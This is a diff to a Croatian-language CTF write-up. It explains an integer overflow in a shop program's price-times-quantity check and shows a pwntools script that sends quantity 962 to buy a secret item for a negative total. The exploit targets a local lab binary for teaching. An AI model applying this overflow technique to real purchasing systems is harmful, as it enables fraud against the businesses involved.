@@ -29,7 +29,7 @@ Na sljedećoj slici prikazan je primjer integer overflow-a u 8-bitnom dvokomplem
 
 Kod dvokomplementnog prikaza brojeva, najznačajniji bit se koristi za mogućnost spremanja negativnih brojeva. U ovom primjeru, najznačajniji bit nosi vrijednost ```-128```. Ako se na vrijednost ```127``` (koja u binarnom prikazu ima sve jedinice osim najznačajnijeg bita) pribroji jedan, tada će se sve jedinice pretvoriti u nule i jedinica će se prenijeti na najznačajniji bit.
 
-U zadatku, integer overflow se pojavljuje prilikom unoška cijene i količine.
+U zadatku dolazi do integer overflowa prilikom umnoška cijene i količine. Budući da su obje varijable tipa ```int```, i njihov umnožak je također tipa ```int```. Zbog ograničenja raspona ovog tipa podatka, ako je rezultat umnoška prevelik za pohranu, dolazi do integer overflow-a.
 
 Izrađen je kratak program koji traži najmanju količinu koja kada se pomnoži s cijenom stvari _Super tajna stvar_ uzrokuje integer overflow:
 ```
@@ -59,32 +59,34 @@ Izlaz programa:
 -2147446596
 ```
 
-Iz izlaza programa vidimo kako je najmanja količina koja uzrokuje integer overflow jednaka ```962```.
+Iz izlaza programa vidimo kako je najmanja količina koja uzrokuje integer overflow jednaka ```962```. Umnoškom cijene i količine dobi se ```-2 147 446 596```
 
-Izraz ```dostupneStvari[opcija-1].cijena * kolicina <= novac``` postaje ```-1135796254 <= novac```. Pošto je ```novac``` uvijek veći ili jednak nuli, izraz postaje istinit.
+Izraz ```dostupneStvari[opcija-1].cijena * kolicina <= novac``` postaje ```-2 147 446 596 <= novac```. Pošto je ```novac``` uvijek veći ili jednak nuli, izraz postaje istinit.
 
 
 ## Iskorištenje ranjivosti
 
-Rješenje:
+Za izradu rješenja može se napraviti Python skripta koja iskorištava integer overflow ranjivost u zadatku. Skripta koristi ```pwntools``` biblioteku za interakciju s kompajliranim programom, omogućujući slanje podataka i primanje odgovora od procesa pokrenutog programa. Nakon pokretanja programa, skripta odabire opciju kupnje stvari (3), zatim bira stvar _Super tajna stvar_ (5) i na kraju šalje količinu koja  uzrokuje integer overflow (962).
+
 ```
 from pwn import *
 
 io = process("./kupovina") #da možemo slati i primati podatke od procesa
-elf = ELF("./kupovina") #omogućava pwn tools da može pročitati gdje su adrese funkcija
+elf = ELF("./kupovina") #omogucava pwntools-u da može procitati gdje su adrese funkcija
 
 # = = = START
 
-print(io.recvuntil(b"Odabir:")) #pricekaj ovaj output
-#b ispred stringa veli pythonu da on to tretiura kao bytove, jer python ima neke druge UTF-8 stringove
+print(io.recvuntil(b"Odabir:")) #pricekaj ovaj output, pa zatim nastavi
+# b ispred stringa veli pythonu da on string tretira kao bytove i pwntools očekuje podatke u obliku bajtova
+# python koristi UTF-8 stringove pa dolaze upozorenja ako se ne koristi b
 
 io.sendline(b"3") #biranje opcije 3
 
 print(io.recvuntil(b"Odaberite stvar koju zelite kupiti (0 za izlaz):")) 
-io.sendline(b"5") #biranje opcije 3
+io.sendline(b"5") #biranje opcije 5
 
 payload = b""
-payload += b"9" * 11
+payload += b"962"
 
 # = = = END
 
